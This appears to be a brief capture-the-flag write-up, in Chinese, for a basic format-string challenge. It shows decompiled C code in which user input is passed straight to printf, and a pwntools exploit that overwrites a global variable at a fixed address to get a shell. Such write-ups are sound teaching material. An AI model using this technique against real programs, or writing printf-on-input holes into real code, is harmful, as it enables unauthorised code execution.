## pwn

## fmt
最基础的字符串格式化漏洞

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+2Ch] [ebp-5Ch]
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(&buf, 0, 0x50u);
  read(0, &buf, 0x50u);
  printf(&buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```
只需要将x的值写为4就能getshell
exp:

```py
payload=fmtstr_payload(11,{0x0804A02C:4})
sh.sendline(payload)
sh.interactive()
```